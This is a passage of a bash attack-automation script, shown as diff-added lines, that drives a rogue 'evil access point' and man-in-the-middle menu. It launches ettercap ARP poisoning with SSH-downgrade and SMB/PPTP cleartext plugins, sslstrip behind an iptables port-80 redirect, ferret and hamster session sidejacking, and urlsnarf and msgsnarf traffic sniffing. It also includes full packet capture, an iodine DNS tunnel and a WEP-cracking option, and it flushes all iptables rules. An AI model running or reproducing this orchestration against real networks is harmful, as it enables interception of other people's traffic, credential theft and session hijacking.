+	 ####################################################
+ 
+ ####################################################
+ #######       Ferret
+ ####################################################
+ echo -e ""$CYAN"Starting ferret "$END""
+ # we append to existing ferret log files
+ echo "####################################################" >> ${LOGFOLDER}ferret.log
+ echo "#######       ferret log started $NOW  " >> ${LOGFOLDER}ferret.log
+ echo "####################################################" >> ${LOGFOLDER}ferret.log
+ if [ $DEBUG = "ON" ]; then echo "DEBUG: usethisint:  $usethisint"; fi
+ # ????  Output redirection does not work with screen, using nohup instead
+ #$screen  -dmS ferret_evilap_on_$usethisint $ferret  -i $usethisint >> ${LOGFOLDER}ferret.log  
+ echo -e ""$RED"Note: Using nohup instead of screen to start ferret."$END""
+ echo -e "Use e.g. tail -f to check logfile"
+
+ nohup $ferret -i $usethisint >> ${LOGFOLDER}ferret.log  2> /dev/null < /dev/null &
+ sleep 3
+ if [ -f ${LOGFOLDER}ferret.log ] ; then
+   echo -e ""$GREEN"ferret started succesfully"$END""
+   echo -e "ferret is logging to: "$BLUE"${LOGFOLDER}ferret.log"$END""
+ else
+   echo -e ""$RED"${LOGFOLDER}ferret.log not found, sslstrip probably not running."$END""
+ fi  #ferret started?
+
+ ####################################################
+ #######      Hamster 
+ ####################################################
+ echo -e ""$CYAN"Starting hamster for sidejacking "$END" "
+ echo -e "Hamster proxy: listening on"$BLUE" 127.0.0.1:$hamster_proxy_port "$END""
+ #not valid anymore  echo -e "Info:  port $hamster_proxy_port probably hardcoded"
+ echo -e "Check out the screens section of the main menu."
+ $screen  -dmS hamster_evilap_on_$usethisint $hamster server.port=$hamster_proxy_port >> $LOGFILE 2>&1
+	
+
+ ####################################################
+ #######       Wifizoo 
+ ####################################################
+ #if [ $use_karma = no ]; then
+ if [ $DEBUG = "ON" ]; then  echo "DEBUG: before starting wifizoo: $usethisint"; fi
+ # start_wifizoo $usethisint
+ # sleep 3
+ #else
+ # echo -e ""$RED"Won't start Wifizoo as Karma is using a none monitoring wifi interface."$END""
+ #fi
+
+
+ fi # karmetasploitchosen=no
+
+
+ echo -en ""$MAGENTA"Press <CR>"$END""
+ read blah
+}
+
+
+
+#Router with NAT Initialization
+#Partly taken from www.darkoperator.com. Check out for other awesome scripts!
+function start_router ()
+{
+ PROXYSERVER=
+ PROXYPORT=
+ if [ -f ${LOGFOLDER}tcpdump.cap ]; then 
+   echo "Found old tcpdump capture file."
+   echo "Moving it to ${LOGFOLDER}tcpdump${NOW}.cap"
+   mv ${LOGFOLDER}tcpdump.cap ${LOGFOLDER}tcpdump${NOW}.cap
+ fi # Problem is, tcpdump can't append to an existing logfile
+ #capture all packets
+ echo -e "Logging packet capture to "$BLUE"${LOGFOLDER}tcpdump.cap"$END""
+ $screen -mdS tcpdump_evilap_on_$usethisint $tcpdump -n -i $usethisint -s 0 -w "${LOGFOLDER}tcpdump.cap" >/dev/null 2>&1 &
+ karmetasploitchosen="no" #is used when chosing the DNS server later on
+ mitmproxychosen="no"
+ onlinechoice=K
+ check_if_online $INTERNETONLINECHECK 
+ if [ $? -gt 0 ]; then 
+    echo -e ""$RED"Internet access seems down. Router functionality won't be started!"$END""; 
+    echo -en ""$MAGENTA"Do you want to use [K]armetasploit or a [P]roxy instead? [K/P]: "$END""
+    read onlinechoice
+ else
+    echo -e ""$GREEN"Internet access seems available"$END""
+    echo -en ""$MAGENTA"Do you want to act as NAT [R]outer, use [K]armetasploit or use a web [P]roxy? "$END""
+    read onlinechoice
+ fi
+
+ if [ x$onlinechoice = xK ];  then 
+    run_karmetasploit
+    karmetasploitchosen="yes"
+ elif [ x$onlinechoice = xP ];  then
+      mitmproxychosen="yes"
+	#### !!! ####
+      echo -e ""$RED"Web proxy usage is not yet fully implemented with the evil AP. Sorry!"$END""
+	#### !!! ####
+      echo -en ""$MAGENTA"Please specify web proxy IP address e.g.[1.2.3.4]: "$END""
+      read PROXYSERVER
+      echo -en ""$MAGENTA"Please specify web proxy port e.g.[3128]: "$END""
+      read PROXYPORT
+      echo "http $PROXYSERVER $PROXYPORT" > ./proxychains.conf
+      echo -en ""$MAGENTA"How do you want to resolve DNS names: [P]roxy or configured [D]NS server? "$END""
+      read howresolve	  
+      if [ x$howresolve = xP ]; then
+      	 echo "proxy_dns" >>  ./proxychains.conf
+      fi
+      #run_mitm_proxy
+ ### add iptables rules here  #####
+
+ elif [ x$onlinechoice = xR ];  then
+      echo -e ""$CYAN"Starting router"$END""
+      echo -e "Adding network route"
+      if [ $DEBUG = "ON" ]; then echo "DEBUG: route add -net $EVILAPNET.0 netmask 255.255.255.0 gw $EVILAPNET.1" ; fi
+      route add -net $EVILAPNET.0 netmask 255.255.255.0 gw $EVILAPNET.1
+      echo "For a clean setup all iptables rules will be flushed"
+      iptables --flush
+      iptables --table nat --flush
+      iptables --delete-chain
+      iptables --table nat --delete-chain
+      echo "Setting up iptables rules"
+      iptables -P FORWARD ACCEPT
+      #doesn't work that way:  iptables -P FORWARD --in-interface $usethisint ACCEPT
+      if [ $DEBUG = "ON" ]; then echo "DEBUG: iptables -t nat -A POSTROUTING -o $INTERNETINT -j MASQUERADE"; fi
+      iptables -t nat -A POSTROUTING -o $INTERNETINT -j MASQUERADE
+      echo -e "Shields up, adding iptables rules to protect your local LAN"
+      ## Allow access to the default gateway
+      if [ $DEBUG = "ON" ]; then echo "DEBUG: iptables giving access to default gw"; fi
+      iptables -A FORWARD -i $usethisint -d $DEFAULTGW -j ACCEPT  >> $LOGFILE 2>&1
+      ## Allow access to the DNS server if different than gateway
+      if [ $DEBUG = "ON" ]; then echo "DEBUG: iptables giving access to DNS server different than default gw"; fi
+      iptables -A FORWARD -i $usethisint -d $DNSSERVER -j ACCEPT   >> $LOGFILE 2>&1
+      ## Allow access to web proxy if specified earlier
+      #iptables -A FORWARD -i $usethisint -d $PROXYSERVER -j ACCEPT   >> $LOGFILE 2>&1
+      ## Blocking access to the local LAN
+      iptables -A FORWARD -i $usethisint -d $LANNET/$LANNETMASK  -j DROP   >> $LOGFILE 2>&1
+      echo "Switching on routing "
+      echo "1" > /proc/sys/net/ipv4/ip_forward
+
+ fi #Karmetasploit or Router or Proxy
+
+ echo -e ""$CYAN"Stopping possible DHCP client and server "$END""
+ killall -9 knetworkmanager dhclient3 dhclient dhcpd dhcpd3 >> $LOGFILE 2>&1 &
+ echo -e ""$CYAN"Starting DHCP daemon"$END""
+ #Clear any dhcp leases that might have been left behind
+ echo > /var/lib/dhcp3/dhcpd.leases
+ #start dhcpd daemon with special configuration file
+ echo "Generating dhcpd.conf"
+ mkdir $DHCPDCONFDIR >> $LOGFILE 2>&1
+ #echo "option domain-name-servers $EVILAPNET.1;" > $DHCPDCONF
+ echo "default-lease-time 60;"> $DHCPDCONF
+ echo "max-lease-time 72;" >> $DHCPDCONF
+ echo "ddns-update-style none;" >> $DHCPDCONF
+ echo "authoritative;" >> $DHCPDCONF
+ echo "log-facility local7;" >> $DHCPDCONF
+ echo "subnet $EVILAPNET.0 netmask 255.255.255.0 {" >> $DHCPDCONF
+ echo "range $EVILAPNET.100 $EVILAPNET.254;" >> $DHCPDCONF
+ echo "option routers $EVILAPNET.1;" >> $DHCPDCONF
+ if [ $karmetasploitchosen = "yes" ]; then
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: karmetasploitchosen $karmetasploitchosen"; fi
+    echo "option domain-name-servers $EVILAPNET.1;" >> $DHCPDCONF
+ else
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: karmetasploitchosen $karmetasploitchosen"; fi
+    for d in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
+    do
+      echo "option domain-name-servers $d;" >> $DHCPDCONF
+      done
+ fi
+ echo "}"  >> $DHCPDCONF
+ if [ ! -f "$dhcpd" ]; then 
+    echo -e ""$RED"Error: DHCPD not found! You won't provide IP addresses! "$END""; 
+ fi
+ $dhcpd -cf $DHCPDCONF  >> $LOGFILE 2>&1 &
+ sleep 2
+ ps -eaf | grep -v grep | grep $DHCPDCONF >>$LOGFILE
+ if [ $? -eq 0 ]; then echo -e ""$GREEN"DHCPD started succesfully"$END""$END""
+ else echo -e ""$RED"The DHCPD server could not be started"$END""
+ fi
+}
+
+
+
+#Cleanup of all running processes
+function stop_evilap ()
+{
+#requires interface name
+	#Partly taken from www.darkoperator.com. Check out for other awesome scripts!
+   	echo -e ""$CYAN"Killing evil access point"$END""
+	echo "Clearing dedicated iptables rules"
+        #iptables --flush
+        #iptables --table nat --flush
+        #iptables --delete-chain
+	echo "Switching off routing"
+        echo "0" > /proc/sys/net/ipv4/ip_forward
+	#echo "--> not sure if required here: Killing tcpdump, dhclient and airbase-ng"
+        #killall -9 knetworkmanager dhclient dhcpd dhcpd3 tcpdump airbase-ng >> $LOGFILE 2>&1 &
+	echo -e "Killing sslstrip...."
+        ps -eaf | grep -v grep | grep sslstrip | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing ettercap...."
+        ps -eaf | grep -v grep | grep ettercap | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing Karmetasploit...."
+        ps -eaf | grep -v grep | grep msfconsole | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing msgsnarf...."
+        ps -eaf | grep -v grep | grep msgsnarf | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing urlsnarf...."
+        ps -eaf | grep -v grep | grep urlsnarf | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing tcpxtract...."
+        ps -eaf | grep -v grep | grep tcpxtract | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing airbase-ng...."
+        ps -eaf | grep -v grep | grep airbase-ng | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing TheMiddler...."
+        ps -eaf | grep -v grep | grep middler.py | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing hostapd...."
+        ps -eaf | grep -v grep | grep hostapd | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing ferret...."
+        ps -eaf | grep -v grep | grep ferret | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing tcpdump...."
+        ps -eaf | grep -v grep | grep tcpdump | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing hamster...."
+        ps -eaf | grep -v grep | grep hamster | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	echo -e "Killing dsniff...."
+        ps -eaf | grep -v grep | grep dsniff | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	if [ -e "/var/lib/dhcp3/dhcpd.leases" ]; then 
+	  echo -e "Removing DHCP leases...."
+          echo > /var/lib/dhcp3/dhcpd.leases
+	fi
+	echo -e "Killing DHCPD...."
+        ps -eaf | grep -v grep | grep dhcpd | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	# the next steps are already done by the cleanup_system routine
+	#if [ x$newint != x ]; then echo "Bringing down interface $newint"
+	#	ifconfig $newint down >> $LOGFILE 2>&1 &
+	#elif [ x$wifi != x ]; then echo "Bringing down interface $wifi"
+	#	ifconfig $wifi down >> $LOGFILE 2>&1 &
+	#else
+	#  echo -e ""$MAGENTA"Evil access point interface not found."$END""
+	#  echo "You might have re-started this script and the interface variable hasn't been initialized."
+	#fi
+	cleanup_system $wifi
+	echo -e ""$GREEN"Evil access point has been stopped."$END""
+	echo -en ""$MAGENTA"Press <CR>"$END""
+	read blah
+}
+
+function stop_MitM ()
+{
+#requires interface name
+        echo -e ""$CYAN"Killing MitM attack"$END""
+        echo "Clearing iptables rules"
+	iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $sslstrip_mitm_lst_port
+        echo -e "Killing sslstrip...."
+        ps -eaf | grep -v grep | grep sslstrip | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1
+        echo -e "Killing ettercap...."
+        ps -eaf | grep -v grep | grep ettercap_MitM | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1
+        echo -e "Killing msgsnarf...."
+        ps -eaf | grep -v grep | grep msgsnarf | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1
+        echo -e "Killing urlsnarf...."
+        ps -eaf | grep -v grep | grep urlsnarf | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1
+        echo -e ""$GREEN"Man in the middle attack has been stopped."$END""
+        echo -en ""$MAGENTA"Press <CR>"$END""
+        read blah
+}
+
+
+
+
+
+########### MAIN ##################################################
+echo
+echo "$name v$version "
+echo "by $by"
+## Some prerequesits ##
+if [ ! -e $TMP ]; then mkdir $TMP  2>&1; fi
+if [ ! -e $LOGFOLDER ]; then 
+	echo "Log folder not present. Creating...."
+	mkdir $LOGFOLDER  
+	if [ $? -ne 0 ]; then 
+	   echo -e ""$RED"ERROR: Can't create logfile. Please check the \$LOGFOLDER parameter."$END""
+	   exit
+	fi
+fi
+echo "******************************************************************"  >> $LOGFILE
+echo "******    Logfile started at $NOW " >> $LOGFILE
+echo "******************************************************************" >> $LOGFILE
+check_requirements
+if [ $? -eq 1 ]; then echo "You can use the built in install option to install missing software"; fi
+newint=""
+wifichip=""
+wifidriver=""
+pick_wireless_interface
+option=1
+while [ $option -ne 0 ]
+do
+ 	clear
+	echo "*****  $name v$version  *****"
+	status_bar
+        echo "________________________Connectivity___________________________"
+	if [ x$wifi != "x" ]; then
+	   echo "  1)  Connect to  2) Disconnect from wireless AP  "
+	   if [ x"`pidof $wpa_supplicant`" != "x" ]; then 
+	      echo -en "      wpa_supplicant ("$GREEN"RUNNING"$END")"
+	      if [ -f $WPASUPPLICANTLOG  ]; then 
+		 echo -e " logs:"$BLUE"$WPASUPPLICANTLOG"$END"" 
+	         else echo ""
+	      fi
+	      else echo -e "      wpa_supplicant ("$RED"STOPPED"$END")"
+ 	   fi
+	fi
+	echo -e "  4)  Run MitM attack with Ettercap  5)  Stop MitM"
+	echo -en "  7)  Iodine DNS tunnel to "$BLUE"$DNSTUNNELDOMAIN"$END"  "
+ 	  DNSTunnel=No
+ 	  check_if_online $DNSTUNNELNET.1
+ 	  if [ $? -gt 0 ]; then DNSTunnel=No; else DNSTunnel=Yes; fi
+          if [ "$DNSTunnel" = "Yes" ]; then echo -e "(Endpoint $DNSTUNNELNET.1 "$GREEN"ONLINE"$END")"; else echo -e "("$RED"OFFLINE"$END")"; fi
+	echo -e "  8)  SSH tunnel to "$BLUE"$SAFEHAVEN"$END"           "    
+	echo -e "  9)  SSH tunnel to DNS tunnel endpoint "$BLUE"$DNSTUNNELNET.1"$END"   "    
+	echo -e " 10)  OpenVPN to "$BLUE"$SAFEHAVEN"$END" "
+        echo "____________________________Wifu_______________________________"
+	echo -en " 11)  Change wifi interface "
+  	if [ x$wifi != "x" ]; then
+	 echo -en " 12)  Clean up "$BLUE"$wifi"$END" "
+ 	 if [ x$newint != "x" ]; then
+    	 echo " `iwlist $newint frequency 2>&1 | grep Current | sed s/Current\ Frequency=//g | sed -e 's/^[ \t]*//' | sed -e '/^$/d'`"
+	 else echo ""
+ 	 fi
+	 if [ x$wifidriver = "xath_pci" ]; then
+	    echo -en " 13)  Set antenna diversity "
+	    get_antenna_settings $wifi
+	 fi
+    	 echo -e " 14)  Change wifi driver. Current driver: "$BLUE"$wifidriver"$END""	
+	 echo " 15)  Scan the air (airodump-ng)" 
+	 echo -en " 16)  Start  17)  Stop Wifizoo "
+ 	   ps -eaf | grep -v grep | grep wifizoo.py >>$LOGFILE
+	   if [ $? -eq 0 ]; then echo -e "("$GREEN"RUNNING"$END"),WebUI on "$BLUE"localhost:$wifizoo_ui_port"$END"" 
+	      else echo -e "("$RED"STOPPED"$END")"
+ 	   fi
+	 wifizoologs=`echo $WIFIZOO | sed s/wifizoo.py//`
+	 if [ -e ${wifizoologs}logs ]; then echo -e "      Wifizoo logs:"$BLUE"${wifizoologs}logs"$END""; else echo ""; fi
+ 	 echo -en "      Hamster sidejacking proxy and Web UI running: "
+	 ps -eaf | grep -v grep |  grep $hamster >> $LOGFILE
+	 if [ $? -eq 0 ]; then echo -e ""$GREEN"Yes"$END" on "$BLUE"localhost:$hamster_proxy_port"$END"" 
+	 else echo -e ""$RED"No "$END""; fi
+
+
+	 if [ $DEBUG = "ON" ]; then echo "DEBUG: EvilAP switch: $EvilAP"; fi
+	 echo -en " 18)  Start  19)  Stop Evil Access Point ("$BLUE"$EVILAPNET.1"$END" "
+           if [ "$EvilAP" = "Yes" ]; then echo -en ""$GREEN"ONLINE"$END"";
+              echo -e " on "$BLUE"`ifconfig | grep -B 2 $EVILAPNET.1 | grep Ethernet | awk '{print $1}'`"$END")"
+ 	   else
+   	      echo -e ""$RED"OFFLINE"$END")"
+ 	   fi
+  	 echo -en " 20)  airtun-ng to wireless system  21)  Stop airtun-ng " 
+	 if [ x"`pidof airtun-ng`" != "x" ]; then
+	    echo -e "("$GREEN"RUNNING"$END")"
+	 else
+	    echo -e "("$RED"STOPPED"$END")"
+	 fi
+         echo " 22)  Crack WEP protected APs (WEPBuster) " 
+        else 
+         echo ""
+	fi
+        echo "________________________Miscellaneous__________________________"
+	echo " 23)  Resume detached screen sessions                      "
+	echo -e ""$CYAN"Running screen terminals: "$END" "
+	$screen -list
+	echo " 24)  Install / update software and drivers   "
+        if [ $DEBUG = "ON" ]; then 
+	   if [ -e $LOGFILE ]; then echo -e " 30)  Show ubitack log "$BLUE"$LOGFILE"$END" `du -h $LOGFILE | awk '{print $1}'`"; fi
+	fi
+	if [ -e ${LOGFOLDER}ettercap_MitM.log ]; then 
+	  echo -en " 31)  Show ettercap "
+	  ps -eaf | grep -v grep | grep ettercap_MitM >>$LOGFILE
+	  if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+	  echo -e "log "$BLUE"${LOGFOLDER}ettercap_MitM.log"$END"" `du -h ${LOGFOLDER}ettercap_MitM.log | awk '{print $1}'`
+	fi
+	if [ -e ${LOGFOLDER}ettercap_evilap.log ]; then 
+	  echo -en " 32)  Show ettercap "
+	  ps -eaf | grep -v grep | grep ettercap_evilap >>$LOGFILE
+	  if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+	  echo -e "log "$BLUE"${LOGFOLDER}ettercap_evilap.log"$END"" `du -h ${LOGFOLDER}ettercap_evilap.log | awk '{print $1}'`
+ 	fi 
+	if [ -e ${LOGFOLDER}sslstrip.log ]; then 
+	  echo -en " 33)  Show sslstrip "
+	  ps -eaf | grep -v grep | grep sslstrip >>$LOGFILE
+	  if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+ 	  echo -e "log "$BLUE"${LOGFOLDER}sslstrip.log"$END" `du -h ${LOGFOLDER}sslstrip.log | awk '{print $1}'`" 
+	fi
+	if [ -e ${LOGFOLDER}urlsnarf.log ]; then 
+	  echo -en " 34)  Show urlsnarf "
+	  ps -eaf | grep -v grep | grep urlsnarf >>$LOGFILE
+          if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+ 	  echo -e "log "$BLUE"${LOGFOLDER}urlsnarf.log"$END" `du -h ${LOGFOLDER}urlsnarf.log | awk '{print $1}'`"
+	fi 
+	if [ -e ${LOGFOLDER}msgsnarf.log ]; then echo -en " 35)  Show msgsnarf "
+   	  ps -eaf | grep -v grep | grep msgsnarf >>$LOGFILE
+          if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+ 	  echo -e "log "$BLUE"${LOGFOLDER}msgsnarf.log"$END" `du -h ${LOGFOLDER}msgsnarf.log | awk '{print $1}'`"
+	fi 
+	if [ -e ${LOGFOLDER}ferret.log ]; then echo -en " 36)  Show ferret   "
+ 	  ps -eaf | grep -v grep | grep ferret >>$LOGFILE
+          if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+	  echo -e "log "$BLUE"${LOGFOLDER}ferret.log"$END" `du -h ${LOGFOLDER}ferret.log | awk '{print $1}'`"; fi 
+
+#	if [ -e ${LOGFOLDER}dsniff.log ]; then 
+#	  echo -en " 37)  Show dsniff   "
+#	  ps -eaf | grep -v grep | grep dsniff >>$LOGFILE
+#          if [ $? -eq 0 ]; then echo -en ""$GREEN"(RUNNING) "$END"" ; fi
+# 	  echo -e "log "$BLUE"${LOGFOLDER}dsniff.log"$END" `du -h ${LOGFOLDER}dsniff.log | awk '{print $1}'`"
+#	fi 
+        echo "_______________________________________________________________"
+	echo -en "  0)  Exit  <CR>  Refresh status information  "$MAGENTA"Your choice:"$END" "
+        read option
+	case $option in 
+	1) echo "*** Select access point to connect to ***"
+	ap=99
+	clear
+	readconfig
+	if [ $? = 0 ]; then
+		cleanup_system $wifi
+		echo -e "Killing remaining wpa_supplicants"
+        	ps -eaf | grep -v grep | grep wpa_supplicant | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1
+		create_wireless_interface $wifi station RANDOM $MYCLIENTMAC
+	        #There is a problem connecting to an AP with ath9k driver, station mode  and having the MAC changed
+		if [ $? != 0 ]; then
+		  echo -e ""$RED"Somthing went wrong! Cannot create wireless station interface."$END""; return 1; fi
+		 ifconfig $newint up
+		 $wpa_supplicant -B -D wext  -i $newint -c $usedconfig -f $WPASUPPLICANTLOG
+	 	 echo -e "wpa_supplicant is logging to:"$BLUE"$WPASUPPLICANTLOG"$END"" 
+		 echo Setting IP address
+		 if [ $IP = "DHCP" ]; then
+			echo Using DHCPCD
+		 	echo Waiting some seconds to finish up AP connection....
+		 	sleep 5
+		        echo Purging current default route
+			route del default  >> $LOGFILE 2>&1
+			$dhcpclient $newint
+		 elif [ $IP = "NONE" ]; then
+			echo No IP information found. 
+		 else
+		        echo -e "Killing dhcp clients...."
+         		ps -eaf | grep -v grep | grep dhclient | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1
+			echo Setting IP $IP $MASK
+			ifconfig $newint $IP netmask $MASK 
+		 fi	
+		 if [ $GW = "NONE" ]; then
+			echo Not setting a default gateway.
+		 elif [ $GW = "DHCP" ]; then
+			echo Using DHCP for default gateway setting.
+		 else
+		        echo Purging current default route
+			route del default  >> $LOGFILE 2>&1
+			echo Setting default route to $GW
+			route add default gw $GW 
+		 fi	
+		 if [ $DNS = "NONE" ]; then
+			echo Not setting a DNS server.
+		 elif [ $DNS = "DHCP" ]; then
+			echo Using DHCP for DNS name server setting.
+		 else
+			echo Adding nameserver
+			echo nameserver $DNS > /etc/resolv.conf
+		 fi		
+		 echo -e ""$GREEN"Ready to talk to the world!"$END""
+		 echo You might want to adapt the antenna diversity afterwards. 
+	else echo -e ""$RED"There was an error while reading the config file"$END""
+	fi
+	echo -ne ""$MAGENTA"Press <CR>"$END""
+	read blah
+	;;		
+	2)
+	  ## Needs improvement. Kill only used wpa_supplicant of chosen wifi interface
+	  echo -e ""$CYAN"Killing wpa_supplicant...."$END""
+	  killall wpa_supplicant >> $LOGFILE 2>&1
+          echo -en ""$MAGENTA"All done. Press <CR>"$END""
+          read blah
+
+
+	;;
+	4)
+	if [ -f $ettercap ]; then
+	  ifconfig | grep -B1 "inet addr"
+	  echo -en ""$MAGENTA"Which interface do you want to use (e.g. eth0): "$END""
+	  read etterint
+	  echo -e "The network you are on is: "$BLUE"`ifconfig eth0 | grep inet\ addr | awk '{print $2}' | sed s/addr://` `ifconfig eth0 | grep Bcast | awk '{print $4}'`"$END""
+	  echo -e ""$MAGENTA"Which hosts do you want to run the MitM attack against?"$END""
+	  echo -e "You can use the following syntax: [IP, IP-IP2, <empty for all>]"
+	  echo -en ""$MAGENTA"Target1 IP?"$END" "
+	  read ettersrc
+	  echo -en ""$MAGENTA"Target2 IP?"$END" "
+   	  read etterdst		
+          echo -e ""$CYAN"Starting ettercap on $etterint with ARP poisoning in the background."$END""
+          #give enough time before next command for interface to come up. Required for ettercap
+	  echo "If ettercap isn't present at the screen's section it might have died due to an empty hostlist"
+          echo "This will take 15 seconds .............."
+          sleep 10
+ 	  if [ -f ${LOGFOLDER}ettercap_MitM.log ]; then
+                echo "Found old ettercap_MitM log file."
+                echo "Moving it to ${LOGFOLDER}ettercap_MitM_${NOW}.log"
+                mv ${LOGFOLDER}ettercap_MitM.log ${LOGFOLDER}ettercap_MitM_${NOW}.log
+          fi
+	  if [ -e $CONFDIR/etter.filter.ssh.co ]; then 
+	     	echo -e ""$GREEN"SSH downgrade filter found. Loading it."$END""
+	  	$screen -dmS ettercap_MitM_on_$etterint $ettercap -Tq -F $CONFDIR/etter.filter.ssh.co -P autoadd -M arp:remote -i $etterint /$ettersrc/ /$etterdst/ -m ${LOGFOLDER}ettercap_MitM.log 
+	  else
+	     	echo -e ""$RED$"SSH downgrade filter not found."$END""
+		$screen -dmS ettercap_MitM_on_$etterint $ettercap -Tq -P smb_clear -P smb_down -P pptp_clear -P autoadd -P repoison_arp -M arp:remote -i $etterint // // -m ${LOGFOLDER}ettercap_MitM.log 
+	  fi
+          sleep 2
+          if [ -f ${LOGFOLDER}ettercap_MitM.log ] ; then
+           echo -e ""$GREEN"ettercap started succesfully"$END""
+           echo -e "Ettercap is logging to:  "$BLUE"${LOGFOLDER}ettercap_MitM.log"$END""
+	   echo -e "Only one plugin can be loaded from the command line. Add more at the console window of Ettercap"
+          else
+           echo -e ""$RED"ettercap could not be started"$END""
+          fi
+        else
+          echo -e ""$RED"Can't find $ettercap. Aborting...."$END""
+          echo "You might want to check out: http://ettercap.sourceforge.net"
+ 	fi #if ettercap
+	  	####					####
+   	  	####      running sslstrip in MitM      ####
+	  	####					####
+   	    	if [ -f ${LOGFOLDER}sslstrip.log ]; then
+     		echo "Found old sslstrip log file."
+     		echo "Moving it to ${LOGFOLDER}sslstrip${NOW}.log"
+     		mv ${LOGFOLDER}sslstrip.log ${LOGFOLDER}sslstrip${NOW}.log
+   		fi # Problem is, sslstrip can't append to an existing logfile
+		echo "Forwarding traffic on port 80 to sslstrip listening on port $sslstrip_mitm_lst_port"
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $sslstrip_mitm_lst_port
+		$screen -dmS sslstrip_evilap python $sslstrip -k -f -l $sslstrip_mitm_lst_port -w ${LOGFOLDER}sslstrip.log >> $LOGFILE 2>&1
+
+		sleep 5
+        	if [ -f ${LOGFOLDER}sslstrip.log ] ; then
+		 echo -e ""$GREEN"sslstrip started succesfully"$END"" 
+	    	 echo -e "sslstrip is logging to: "$BLUE"${LOGFOLDER}sslstrip.log"$END""
+		fi
+	  	####					####
+   	  	####      running urlsnarf in MitM      ####
+	  	####					####
+ 		# Output redirection does not work with screen, using nohup instead
+ 		echo -e ""$RED"Note: Using nohup instead of screen to start urlsnarf."$END""
+ 		echo -e "Use e.g. tail -f to check logfile"
+ 		nohup $urlsnarf  -i $etterint >> ${LOGFOLDER}urlsnarf.log  2> /dev/null < /dev/null & 
+		#$screen -m -d -S urlsnarf_MitM_on_$etterint $urlsnarf  -i $etterint >> ${LOGFOLDER}urlsnarf.log
+        	if [ -f ${LOGFOLDER}urlsnarf.log ] ; then
+		 echo -e ""$GREEN"urlsnarf started succesfully"$END"" 
+	    	 echo -e "urlsnarf is logging to: "$BLUE"${LOGFOLDER}urlsnarf.log"$END""
+		fi
+	  	####					####
+   	  	####      running msgsnarf in MitM      ####
+	  	####					####
+ 		echo -e ""$RED"Note: Using nohup instead of screen to start msgsnarf."$END""
+ 		echo -e "Use e.g. tail -f to check logfile"
+		nohup $msgsnarf  -i $etterint >> ${LOGFOLDER}msgsnarf.log 2> /dev/null < /dev/null & 
+        	if [ -f ${LOGFOLDER}msgsnarf.log ] ; then
+		 echo -e ""$GREEN"msgsnarf started succesfully"$END"" 
+	    	 echo -e "msgsnarf is logging to: "$BLUE"${LOGFOLDER}msgsnarf.log"$END""
+		fi
+          echo -en ""$MAGENTA"Check output above and press <CR>"$END""
+          read blah
+	;;
+	5) stop_MitM
+	;;
+	7)
+	if [ -f $IODINE ]; then 
+       	 echo -e ""$CYAN"Starting DNS Tunnel ...."$END""
+	 echo -e "Using "$BLUE"$DNSTUNNELDOMAIN"$END" as target domain name"
+	 echo "Make sure the responsible DNS server has an NS record pointing to your iodined server"
+	 echo "At the server side you might wannt to run:"
+	 echo "$screen  $IODINED -f -P secretpass $DNSTUNNELNET.1/24 $DNSTUNNELDOMAIN"
+	 echo -e ""$CYAN"Preparing the tunnel interface"$END""
+	 rm -r /dev/net/tun 
+	 mkdir -p /dev/net
+	 mknod /dev/net/tun c 10 200
+	 chown root:root /dev/net/tun
+	 chmod 600 /dev/net/tun
+         echo -e "Iodine DNS Tunnel will start now."
+	 echo "Check the screen section of the main menu for presence of the iodine client"
+	 echo "Enter the password and use <CTRL-A-D> to return from the iodine screen"
+	 echo -e ""$MAGENTA"Press <CR> now to proceed"$END""
+	 $screen -S Iodine_DNS_Tunnel_$DNSTUNNELNET.0 $IODINE  -f $DNSTUNNELDOMAIN
+	 sleep 3
+	 check_if_online $DNSTUNNELNET.1
+         if [ $? -gt 0 ]; then echo -e ""$RED"DNS Tunnel endpoint $DNSTUNNELNET.1 is not yet reachable!"$END""; 
+	 else echo -e ""$GREEN"DNS Tunnel endpoint $DNSTUNNELNET.1 is reachable."$END"";
+         fi
+	else 
+	  echo -e ""$RED"Can't find $IODINE. Aborting...."$END""
+	  echo "You might want to check out: http://code.kryo.se/iodine/"  
+        fi
+	echo -ne ""$MAGENTA"Check the above output and press <CR>"$END""
+        read blah
+
+	;;
+
+	8) echo -e ""$CYAN"Starting SSH to $SAFEHAVEN...."$END""
